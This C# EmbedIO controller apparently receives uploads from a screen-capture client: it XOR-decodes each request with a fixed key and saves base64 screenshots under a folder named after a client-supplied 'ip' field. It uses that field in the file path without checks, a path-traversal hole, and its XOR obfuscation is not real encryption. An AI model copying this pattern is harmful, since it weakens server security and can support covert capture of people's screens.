using EmbedIO;
using EmbedIO.WebApi;
using Newtonsoft.Json.Linq;
using System.Text;
using System.Text.RegularExpressions;
using EmbedIO.Routing;

/**
 * https://github.com/unosquare/embedio
 * https://github.com/unosquare/embedio/wiki/Cookbook
 */
internal class V1Controller : WebApiController
{

    [Route(HttpVerbs.Get, "/t")]
    public string GetText()
    {
        return $"{DateTime.UtcNow:yyyy-MM-dd HH:mm:ss}";
    }

    [Route(HttpVerbs.Get, "/tt")]
    public void GetBinaryText()
    {
        using var writer = HttpContext.OpenResponseText();
        writer.WriteAsync($"{DateTime.UtcNow:yyyy-MM-dd HH:mm:ss}");
    }

    [Route(HttpVerbs.Post, "/upload")]
    public void PostUpload()
    {
        using MemoryStream memoryStream = new();
        HttpContext.OpenRequestStream().CopyTo(memoryStream);
        var requestBytes = memoryStream.ToArray();
        v1PostUpload(requestBytes, HttpContext.Request.SafeGetRemoteEndpointStr());
    }

    static void v1PostUpload(byte[]? contentBytes, string? remoteAddr)
    {
        if (contentBytes == null) return;
        string? contentText = null;
        new Thread(() =>
        {
            try
            {
                Encrypt(ref contentBytes);
                contentText = Encoding.UTF8.GetString(contentBytes);
                if (contentText.Contains("\"screen\":[") && !contentText.EndsWith("[]}") && !contentText.EndsWith("\"]}")) contentText += "\"]}";
                JObject jObject = JObject.Parse(contentText);
                // var window = (string?)jObject["window"];
                var ip = (string?)jObject["ip"];
                var user = (string?)jObject["user"];
                var screenArray = (JArray?)jObject["screen"];
                int screenCount = screenArray == null ? 0 : screenArray.Count;
                if (screenCount == 0)
                {
                    
                }
                else
                {
                    for (int i = 0; i < screenCount; i++)
                    {
                        string filename = $"log/{ip}/{DateTime.UtcNow:yyMMdd-HHmmssfff}-{i}.png";
                        var fileInfo = new FileInfo(filename);
                        fileInfo.Directory!.Create();
                        byte[] bytes;
                        try
                        {
                            bytes = Convert.FromBase64String((string)screenArray![i]!);
                        }
                        catch (Exception ex)
                        {
                            bytes = Encoding.UTF8.GetBytes(ex.Message);
                        }
                        File.WriteAllBytes(filename, bytes);
                        
                    }
                }
                
            }
            catch (Exception ex)
            {
                
            }
        }).Start();
    }

    private static readonly byte[] KEY = { 1, 2, 3, 4 };

    private static void Encrypt(ref byte[] input)
    {
        int length = input.Length;
        int keyLength = KEY.Length;
        for (int i = 0; i < length; i++)
            input[i] ^= KEY[i % keyLength];
    }

}
